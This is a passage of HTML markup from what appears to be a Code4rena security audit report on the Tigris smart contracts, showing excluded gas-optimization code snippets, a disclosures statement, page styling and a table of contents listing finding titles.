class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">() == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">protocol</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;!Protocol&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L21</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"227\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StableToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">52</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">isMinter</span><span class=\"mtk1\">[</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">()], </span><span class=\"mtk8\">&quot;!Minter&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L52</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"228\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StableVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">45</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">allowed</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">], </span><span class=\"mtk8\">&quot;Token not listed&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">79</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(!</span><span class=\"mtk12\">allowed</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">], </span><span class=\"mtk8\">&quot;Already added&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">90</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">allowed</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">], </span><span class=\"mtk8\">&quot;Not added&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L45</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"229\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TradingExtension</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">279</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">trading</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!protocol&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L279</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"230\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Trading</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">876</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">allowedVault</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_stableVault</span><span class=\"mtk1\">], </span><span class=\"mtk8\">&quot;Unapproved stablevault&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">877</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">IStableVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_stableVault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">stable</span><span class=\"mtk1\">() || </span><span class=\"mtk11\">IStableVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_stableVault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">allowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Token not approved in vault&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">887</span><span class=\"mtk1\">:              </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proxy</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">() &amp;&amp; </span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">time</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Proxy not approved&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L876</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"231\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TradingLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_provider</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">_priceData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;BadSig&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_isNode</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_provider</span><span class=\"mtk1\">], </span><span class=\"mtk8\">&quot;!Node&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">107</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">_priceData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!Asset&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">108</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(!</span><span class=\"mtk12\">_priceData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">isClosed</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Closed&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">109</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">_priceData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;FutSig&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">110</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">_priceData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_validSignatureTimer</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;ExpSig&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">111</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_priceData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;NoPrice&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/TradingLibrary.sol#L105</p>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .mtk6 { color: #D7BA7D; }\n  .dark-default-dark .mtk5 { color: #D16969; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-11\">High Risk Findings (11)</a></p>\n<ul>\n<li><a href=\"#h-01-locksol-assets-deposited-with-lockextendlock-function-are-lost\">[H-01] Lock.sol: assets deposited with Lock.extendLock function are lost</a></li>\n<li><a href=\"#h-02-riskless-trades-due-to-delay-check\">[H-02] Riskless trades due to delay check</a></li>\n<li><a href=\"#h-03-certain-fee-configuration-enables-vaults-to-be-drained\">[H-03] Certain fee configuration enables vaults to be drained</a></li>\n<li><a href=\"#h-04-bypass-the-maximum-pnl-check-to-take-extra-profit\">[H-04] Bypass the maximum PnL check to take extra profit</a></li>\n<li><a href=\"#h-05-malicious-user-can-steal-all-assets-in-bondnft\">[H-05] Malicious user can steal all assets in BondNFT</a></li>\n<li><a href=\"#h-06-incorrect-calculation-of-new-price-while-adding-position\">[H-06] Incorrect calculation of new price while adding position</a></li>\n<li><a href=\"#h-07-reentrancy-attack-during-mint-function-in-position-contract-which-can-lead-to-removing-of-the-other-users-limit-orders-or-stealing-contract-funds-because-initid-is-set-low-value\">[H-07] reentrancy attack during <code>mint()</code> function in Position contract which can lead to removing of the other user’s limit orders or stealing contract funds because initId is set low value</a></li>\n<li><a href=\"#h-08-incorrect-assumption-of-stablecoin-market-stability\">[H-08] Incorrect Assumption of Stablecoin Market Stability</a></li>\n<li><a href=\"#h-09-users-can-bypass-the-maxwinpercent-limit-using-a-partially-closing\">[H-09] Users can bypass the <code>maxWinPercent</code> limit using a partially closing</a></li>\n<li><a href=\"#h-10-user-can-abuse-tight-stop-losses-and-high-leverage-to-make-risk-free-trades\">[H-10] User can abuse tight stop losses and high leverage to make risk free trades</a></li>\n<li><a href=\"#h-11-not-enough-margin-pulled-or-burned-from-user-when-adding-to-a-position\">[H-11] Not enough margin pulled or burned from user when adding to a position</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-24\">Medium Risk Findings (24)</a></p>\n<ul>\n<li><a href=\"#m-01-locksol-claimgovfees-function-can-cause-assets-to-be-stuck-in-the-lock-contract\">[M-01] Lock.sol: claimGovFees function can cause assets to be stuck in the Lock contract</a></li>\n<li><a href=\"#m-02-must-approve-0-first\">[M-02] Must approve 0 first</a></li>\n<li><a href=\"#m-03-bypass-the-delay-security-check-to-win-risk-free-funds\">[M-03] Bypass the delay security check to win risk free funds</a></li>\n<li><a href=\"#m-04-approved-operators-of-position-token-cant-call-tradinginitiatecloseorder\">[M-04] Approved operators of Position token can’t call Trading.initiateCloseOrder</a></li>\n<li><a href=\"#m-05-failure-in-endpoint-can-cause-minting-more-than-one-nft-with-the-same-token-id-in-different-chains\">[M-05] Failure in <code>endpoint</code> can cause minting more than one NFT with the same token id in different chains</a></li>\n<li><a href=\"#m-06-bondnfts-can-revert-when-transferred\">[M-06] BondNFTs can revert when transferred</a></li>\n<li><a href=\"#m-07-trading-will-not-work-on-ethereum-if-usdt-is-used\">[M-07] Trading will not work on Ethereum if USDT is used</a></li>\n<li><a href=\"#m-08-govnft-maxbridge-has-no-effect\">[M-08] GovNFT: maxBridge has no effect</a></li>\n<li><a href=\"#m-09-safetransfermany-doesnt-actually-use-safe-transfer\">[M-09] <code>safeTransferMany()</code> doesn’t actually use safe transfer</a></li>\n<li><a href=\"#m-10-bondnftextendlock-force-a-user-to-extend-the-bond-at-least-for-current-bondperiod\">[M-10] <code>BondNFT.extendLock</code> force a user to extend the bond at least for current bond.period</a></li>\n<li><a href=\"#m-11-_handleopenfees-returns-an-incorrect-value-for-_feepaid-this-directly-impacts-margin-calculations\">[M-11] <code>_handleOpenFees</code> returns an incorrect value for <code>_feePaid</code>. This directly impacts margin calculations</a></li>\n<li><a href=\"#m-12-centralization-risks-owner-can-freeze-withdraws-and-use-timelock-to-steal-all-funds\">[M-12] Centralization risks: owner can freeze withdraws and use timelock to steal all funds</a></li>\n<li><a href=\"#m-13-one-can-become-referral-of-hash-0x0-and-because-all-users-default-referral-hash-is-0x0-so-he-would-become-all-users-referral-by-default-and-earn-a-lot-of-fees-while-users-didnt-approve-it\">[M-13] One can become referral of hash 0x0 and because all users default referral hash is 0x0 so he would become all users referral by default and earn a lot of fees while users didn’t approve it</a></li>\n<li><a href=\"#m-14-bondnftsolclaim-needs-to-correct-all-the-missing-epochs\">[M-14] <code>BondNFT.sol#claim()</code> needs to correct all the missing epochs</a></li>\n<li><a href=\"#m-15-_checkdelay-will-not-work-properly-for-arbitrum-or-optimism-due-to-blocknumber-\">[M-15] <code>_checkDelay</code> will not work properly for Arbitrum or Optimism due to <code>block.number</code> </a></li>\n<li><a href=\"#m-16-distribute-wont-update-epochtigasset-when-totalsharestigasset0-which-can-cause-later-created-bond-for-this-tigasset-to-have-wrong-mint-epoch\">[M-16] <code>distribute()</code> won’t update <code>epoch[tigAsset]</code> when <code>totalShares[tigAsset]==0</code> which can cause later created bond for this tigAsset to have wrong mint epoch</a></li>\n<li><a href=\"#m-17-user-can-close-an-order-via-limitclose-and-take-bot-fees-to-themselves\">[M-17] User can close an order via <code>limitClose()</code>, and take bot fees to themselves</a></li>\n<li><a href=\"#m-18-stoplosstakeprofit-should-be-validated-again-for-the-new-price-in-tradingexecutelimitorder\">[M-18] StopLoss/TakeProfit should be validated again for the new price in <code>Trading.executeLimitOrder()</code></a></li>\n<li><a href=\"#m-19-_handledeposit-and-_handlewithdraw-do-not-account-for-tokens-with-decimals-higher-than-18\">[M-19] <code>_handleDeposit</code> and <code>_handleWithdraw</code> do not account for tokens with decimals higher than 18</a></li>\n<li><a href=\"#m-20-tradinginitiatemarketorder-allows-to-open-a-position-with-more-margin-than-expected-due-to-_handleopenfees-wrong-calculation-when-a-trade-is-referred\">[M-20] Trading#initiateMarketOrder allows to open a position with more margin than expected due to _handleOpenFees wrong calculation when a trade is referred</a></li>\n<li><a href=\"#m-21-executelimitorder-modifies-open-interest-with-a-wrong-position-value\">[M-21] <code>executeLimitOrder()</code> modifies open-interest with a wrong position value</a></li>\n<li><a href=\"#m-22-unreleased-locks-cause-the-reward-distribution-to-be-flawed-in-bondnft\">[M-22] Unreleased locks cause the reward distribution to be flawed in BondNFT</a></li>\n<li><a href=\"#m-23-governance-nft-holder-whose-nft-was-minted-before-trading_handleopenfees-function-is-called-can-lose-deserved-rewards-after-trading_handleopenfees-function-is-called\">[M-23] Governance NFT holder, whose NFT was minted before <code>Trading._handleOpenFees</code> function is called, can lose deserved rewards after <code>Trading._handleOpenFees</code> function is called</a></li>\n<li><a href=\"#m-24-chainlink-price-feed-is-not-sufficiently-validated-and-can-return-stale-price\">[M-24] Chainlink price feed is not sufficiently validated and can return stale price</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#01-use-call-instead-of-transfer-to-send-ether\">01 Use <code>.call</code> instead of <code>.transfer</code> to send ether</a></li>\n<li><a href=\"#02-unbounded-loop\">02 Unbounded loop</a></li>\n<li><a href=\"#03-use-the-safe-variant-and-erc721mint\">03 Use the safe variant and <code>ERC721.mint</code></a></li>\n<li><a href=\"#04-usage-of-deprecated-chainlink-api\">04 Usage of deprecated chainlink API</a></li>\n<li><a href=\"#05-lack-of-checks-effects-interactions\">05 Lack of checks-effects-interactions</a></li>\n<li><a href=\"#06-lack-of-zero-address-checks-for-tradingsol-constructor-for-the-variables-_position-_gov-and-_pairscontract\">06 Lack of zero address checks for <code>Trading.sol</code> constructor for the variables <code>_position</code>, <code>_gov</code> and <code>_pairsContract</code></a></li>\n<li><a href=\"#07-add-an-event-for-critical-parameter-changes\">07 Add an event for critical parameter changes</a></li>\n<li><a href=\"#08-missing-unit-tests\">08 Missing unit tests</a></li>\n<li><a href=\"#09-pragma-float\">09 Pragma float</a></li>\n<li><a href=\"#10-contract-layout-and-order-of-functions\">10 Contract layout and order of functions</a></li>\n<li><a href=\"#11-use-time-units-directly\">11 Use time units directly</a></li>\n<li><a href=\"#12-declare-interfaces-on-separate-files\">12 Declare interfaces on separate files</a></li>\n<li><a href=\"#13-constants-should-be-upper-case\">13 Constants should be upper case</a></li>\n<li><a href=\"#14-use-private-constant-consistently\">14 Use <code>private constant</code> consistently</a></li>\n<li><a href=\"#15-add-a-limit-for-the-maximum-number-of-characters-per-line\">15 Add a limit for the maximum number of characters per line</a></li>\n<li><a href=\"#16-declaring-a-return-named-variable-and-returning-a-manual-value-for-the-same-function\">16 Declaring a <code>return named variable</code> and returning a manual value for the same function</a></li>\n<li><a href=\"#17-lack-of-spacing-in-comment\">17 Lack of spacing in comment</a></li>\n<li><a href=\"#18-critical-changes-should-use-two-step-procedure\">18 Critical changes should use two-step procedure</a></li>\n<li><a href=\"#19-missing-natspec\">19 Missing NATSPEC</a></li>\n<li><a href=\"#20-interchangeable-usage-of-uint-and-uint256\">20 Interchangeable usage of uint and uint256</a></li>\n<li><a href=\"#21-move-requirevalidation-statements-to-the-top-of-the-function-when-validating-input-parameters\">21 Move require/validation statements to the top of the function when validating input parameters</a></li>\n<li><a href=\"#22-remove-consolelog-import-in-locksol\">22 Remove console.log import in <code>Lock.sol</code></a></li>\n<li><a href=\"#23-draft-openzeppelin-dependencies\">23 Draft OpenZeppelin dependencies</a></li>\n<li><a href=\"#24-named-imports-can-be-used\">24 Named imports can be used</a></li>\n<li><a href=\"#25-imports-can-be-grouped-together\">25 Imports can be grouped together</a></li>\n<li><a href=\"#26-constant-redefined-elsewhere\">26 Constant redefined elsewhere</a></li>\n<li><a href=\"#27-convert-repeated-validation-statements-into-a-function-modifier-to-improve-code-reusability\">27 Convert repeated validation statements into a function modifier to improve code reusability</a></li>\n<li><a href=\"#28-large-multiples-of-ten-should-use-scientific-notation\">28 Large multiples of ten should use scientific notation.</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#gas-optimizations-summary\">Gas Optimizations Summary</a></li>\n<li><a href=\"#g01--multiple-addressid-mappings-can-be-combined-into-a-single-mapping-of-an-addressid-to-a-struct-where-appropriate\">G‑01  Multiple <code>address</code>/ID mappings can be combined into a single <code>mapping</code> of an <code>address</code>/ID to a <code>struct</code>, where appropriate</a></li>\n<li><a href=\"#g02--state-variables-only-set-in-the-constructor-should-be-declared-immutable\">G‑02  State variables only set in the constructor should be declared <code>immutable</code></a></li>\n<li><a href=\"#g03--state-variables-can-be-packed-into-fewer-storage-slots\">G‑03  State variables can be packed into fewer storage slots</a></li>\n<li><a href=\"#g04--structs-can-be-packed-into-fewer-storage-slots\">G‑04  Structs can be packed into fewer storage slots</a></li>\n<li><a href=\"#g05--using-storage-instead-of-memory-for-structsarrays-saves-gas\">G‑05  Using <code>storage</code> instead of <code>memory</code> for structs/arrays saves gas</a></li>\n<li><a href=\"#g06--avoid-contract-existence-checks-by-using-low-level-calls\">G‑06  Avoid contract existence checks by using low level calls</a></li>\n<li><a href=\"#g07--multiple-accesses-of-a-mappingarray-should-use-a-local-variable-cache\">G‑07  Multiple accesses of a mapping/array should use a local variable cache</a></li>\n<li><a href=\"#g08--the-result-of-function-calls-should-be-cached-rather-than-re-calling-the-function\">G‑08  The result of function calls should be cached rather than re-calling the function</a></li>\n<li><a 